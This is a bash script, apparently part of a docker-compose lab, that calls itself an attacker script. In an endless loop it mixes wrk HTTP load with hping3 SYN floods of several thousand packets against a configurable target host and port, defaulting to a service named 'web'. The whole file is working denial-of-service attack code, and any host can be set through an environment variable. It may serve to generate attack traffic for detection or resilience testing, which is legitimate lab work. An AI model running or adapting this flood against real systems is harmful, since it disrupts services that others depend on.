#!/bin/bash

# Simple attacker script to generate background traffic and bursts of SYN packets.
# This script uses wrk to issue HTTP requests to the web service and
# hping3 to send SYN floods.  Both tools are configurable via
# environment variables.

set -e

# Target host and port; fall back to docker‑compose service names
TARGET_HOST="${TARGET_HOST:-web}"
TARGET_PORT="${TARGET_PORT:-80}"

echo "Attacker started; targeting $TARGET_HOST:$TARGET_PORT"

while true; do
    # Normal load test: sustain connections for 30 seconds
    echo "[*] Generating benign HTTP traffic with wrk"
    wrk -c 8 -t 4 -d 30s http://$TARGET_HOST:$TARGET_PORT/ || true
    # Sleep a random interval before the next attack burst (10–30 seconds)
    sleep $((10 + RANDOM % 20))
    # Launch a SYN flood for a short duration
    DURATION=$((5 + RANDOM % 5))
    PACKETS=$((5000 + RANDOM % 5000))
    echo "[*] Launching SYN flood: $PACKETS packets over $DURATION seconds"
    hping3 -c "$PACKETS" -d 120 -S -w 64 -p "$TARGET_PORT" --flood "$TARGET_HOST" || true
    sleep $((20 + RANDOM % 20))
done
